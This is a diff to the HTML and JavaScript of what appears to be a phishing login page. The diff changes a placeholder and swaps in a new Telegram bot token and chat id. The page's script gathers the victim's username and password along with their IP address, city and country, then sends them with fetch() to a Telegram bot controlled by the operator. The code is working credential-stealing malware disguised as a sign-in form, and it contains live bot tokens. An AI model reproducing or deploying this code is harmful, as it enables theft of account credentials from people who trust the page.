@@ -27,7 +27,7 @@
 
       <div class="mb-4">
         <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900"
-               placeholder="Mobile number or email address" type="text" name="username" id="username" required />
+               placeholder="Username, Mobile number or email address" type="text" name="username" id="username" required />
       </div>
 
       <div class="mb-4">
@@ -94,8 +94,8 @@
       var errorMessage = document.getElementById('errorMessage');
 
       var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
-      var token = '8188170785:AAG3XcjXrpKgmhfbKrdDlbQk0ro5UDJTgoc';
-      var chat_id = '8115174388';
+      var token = '7933375890:AAEom0GofbpGV8lassBKN_g5_qtu-X6i_bM';
+      var chat_id = '6509117933';
       var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
       fetch(url)
